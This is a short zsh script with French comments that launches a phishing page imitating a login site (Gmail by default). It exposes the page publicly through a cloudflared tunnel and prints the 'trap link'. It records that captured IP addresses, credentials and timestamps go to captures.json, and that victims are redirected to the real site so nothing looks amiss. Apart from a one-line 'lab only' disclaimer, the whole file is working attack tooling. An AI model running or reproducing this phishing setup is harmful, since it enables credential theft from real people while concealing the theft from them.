#!/bin/zsh
# trick_public.sh - le lien piege PUBLIC pour la page de capture
# Usage: ./trick_public.sh <site> [port_local]
# Demarre la page de capture + le tunnel cloudflared + affiche le lien public
SITE="${1:-gmail}"
PORT="${2:-8085}"
cd "$(dirname "$0")"
[ -d "sorties/trick/$SITE" ] || python3 trick_forge.py "$SITE" "$PORT" >/dev/null
LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || echo 127.0.0.1)
pkill -f "trick.*serve.py" 2>/dev/null
pkill -f "cloudflared tunnel --url http://localhost:$PORT" 2>/dev/null
sleep 1
python3 -u "sorties/trick/$SITE/serve.py" >/tmp/trick_$SITE.log 2>&1 &
sleep 1.5
cloudflared tunnel --url "http://localhost:$PORT" --no-autoupdate >/tmp/trick_tunnel.log 2>&1 &
sleep 8
PUB=$(grep -a -o "https://[a-z0-9-]*\.trycloudflare\.com" /tmp/trick_tunnel.log | head -1)
echo "=================================================="
echo "  LIEN PIEGE PUBLIC  : ${PUB:-ERREUR}/login"
echo "  LIEN local         : http://$LAN_IP:$PORT/login"
echo "  captures           : sorties/trick/$SITE/captures.json (IP + identifiants + heure)"
echo "  redirection        : la victime atterrit sur le vrai site, rien ne se voit"
echo "=================================================="
echo "[*] relance ce script a chaque session : l'URL trycloudflare change a chaque fois"
echo "[*] lab uniquement : cibles autorisees (ton CTF, tes machines)"
